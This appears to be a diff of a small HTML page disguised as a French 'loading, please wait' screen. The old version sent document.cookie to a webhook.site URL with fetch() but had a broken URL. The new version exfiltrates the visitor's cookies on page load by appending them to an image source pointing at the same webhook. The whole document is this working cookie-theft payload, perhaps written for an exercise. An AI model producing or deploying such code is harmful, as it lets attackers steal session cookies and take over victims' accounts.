@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>🤫</title>
-</head>
-<body>
-  <h1>Chargement...</h1>
-  <script>
-    fetch("hhttps://webhook.site/88c88ccb-cab6-4c3b-9f4d-002b9891f972?cookie=" + document.cookie);
-  </script>
-</body>
+  <head><title>Chargement...</title></head>
+  <body>
+    <img src="https://webhook.site/88c88ccb-cab6-4c3b-9f4d-002b9891f972?cookie=" id="exfil" />
+    <script>
+      document.getElementById('exfil').src += document.cookie;
+    </script>
+    <p>Merci de patienter...</p>
+  </body>
 </html>
